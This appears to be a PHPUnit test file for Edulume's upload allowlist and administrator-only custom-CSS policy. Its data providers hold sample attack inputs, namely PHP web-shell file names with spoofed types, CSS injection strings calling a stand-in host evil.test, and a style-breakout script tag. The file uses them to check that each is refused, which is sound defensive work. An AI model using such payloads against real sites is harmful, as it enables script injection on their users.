<?php

declare(strict_types=1);

namespace Edulume\Core\Tests\Unit\Security;

use Edulume\Core\Domain\Security\CustomCodePolicy;
use Edulume\Core\Domain\Security\UploadPolicy;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\Attributes\Test;
use PHPUnit\Framework\TestCase;

final class UploadAndCustomCodeTest extends TestCase
{
    #[Test]
    public function the_upload_allowlist_covers_what_a_consultancy_actually_uploads(): void
    {
        $allowed = UploadPolicy::allowedTypes();

        foreach (['jpg', 'png', 'webp', 'svg', 'pdf', 'docx', 'csv'] as $extension) {
            self::assertArrayHasKey($extension, $allowed, $extension);
        }

        foreach (['php', 'phtml', 'js', 'html', 'exe', 'sh'] as $extension) {
            self::assertArrayNotHasKey($extension, $allowed, $extension);
        }
    }

    /**
     * @return list<array{string, bool}>
     */
    public static function filenames(): array
    {
        return [
            ['transcript.pdf', true],
            ['photo.JPG', true],
            ['payload.php', false],
            ['payload.phtml', false],
            ['archive.tar.gz', false],
            ['noextension', false],
        ];
    }

    #[Test]
    #[DataProvider('filenames')]
    public function only_allowlisted_extensions_are_accepted(string $filename, bool $expected): void
    {
        self::assertSame($expected, UploadPolicy::isAllowedExtension($filename));
    }

    #[Test]
    public function a_double_extension_is_judged_on_the_last_one_and_on_its_contents(): void
    {
        self::assertTrue(UploadPolicy::isAllowedExtension('payload.php.jpg'));
        self::assertFalse(UploadPolicy::typeMatches('payload.php.jpg', 'application/x-httpd-php'));
        self::assertTrue(UploadPolicy::typeMatches('payload.php.jpg', 'image/jpeg'));
    }

    #[Test]
    public function the_claimed_type_must_agree_with_the_extension(): void
    {
        self::assertTrue(UploadPolicy::typeMatches('brochure.pdf', 'application/pdf'));
        self::assertTrue(UploadPolicy::typeMatches('brochure.pdf', ' APPLICATION/PDF '));
        self::assertFalse(UploadPolicy::typeMatches('brochure.pdf', 'text/html'));
        self::assertFalse(UploadPolicy::typeMatches('script.php', 'application/pdf'));
    }

    #[Test]
    public function only_an_svg_needs_sanitising(): void
    {
        self::assertTrue(UploadPolicy::needsSanitising('logo.svg'));
        self::assertFalse(UploadPolicy::needsSanitising('logo.png'));
    }

    #[Test]
    public function an_acceptable_upload_is_refused_for_nothing(): void
    {
        self::assertSame([], UploadPolicy::reasonsToRefuse('brochure.pdf', 'application/pdf', 2048));
    }

    #[Test]
    public function an_oversized_empty_or_wrong_type_upload_says_why(): void
    {
        self::assertSame(
            ['That file is larger than 10 MB.'],
            UploadPolicy::reasonsToRefuse('brochure.pdf', 'application/pdf', UploadPolicy::MAX_BYTES + 1),
        );
        self::assertSame(
            ['That file is empty.'],
            UploadPolicy::reasonsToRefuse('brochure.pdf', 'application/pdf', 0),
        );
        self::assertSame(
            ['That file type is not allowed.'],
            UploadPolicy::reasonsToRefuse('shell.php', 'application/x-httpd-php', 100),
        );
        self::assertSame(
            ['The file contents do not match its extension.'],
            UploadPolicy::reasonsToRefuse('shell.jpg', 'application/x-httpd-php', 100),
        );
    }

    #[Test]
    public function custom_code_is_administrators_only(): void
    {
        self::assertTrue(CustomCodePolicy::allows(['edit_themes', 'manage_options']));
        self::assertFalse(CustomCodePolicy::allows(['manage_options', 'edit_posts']));
        self::assertFalse(CustomCodePolicy::allows([]));
    }

    /**
     * @return list<array{string}>
     */
    public static function dangerousCss(): array
    {
        return [
            ['width: expression(alert(1));'],
            ['@import url("https://evil.test/x.css");'],
            ['background: url(javascript:alert(1));'],
            ['behavior: url(#default#userdata);'],
            ['-moz-binding: url("https://evil.test/x.xml#xss");'],
        ];
    }

    #[Test]
    #[DataProvider('dangerousCss')]
    public function css_that_can_execute_is_refused_with_a_reason(string $css): void
    {
        $reasons = CustomCodePolicy::reasonsToRefuseCss($css);

        self::assertNotSame([], $reasons);
        self::assertNotSame('', $reasons[0]);
    }

    #[Test]
    public function ordinary_css_is_accepted(): void
    {
        self::assertSame([], CustomCodePolicy::reasonsToRefuseCss('.edulume-card { border-radius: 12px; }'));
        self::assertCount(5, CustomCodePolicy::forbiddenCssPatterns());
    }

    #[Test]
    public function css_that_would_break_out_of_the_style_element_is_refused(): void
    {
        self::assertTrue(CustomCodePolicy::breaksOutOfStyleElement('a{}</style><script>alert(1)</script>'));
        self::assertTrue(CustomCodePolicy::breaksOutOfStyleElement('a{}</ style >'));
        self::assertFalse(CustomCodePolicy::breaksOutOfStyleElement('.a { content: "style"; }'));
    }
}
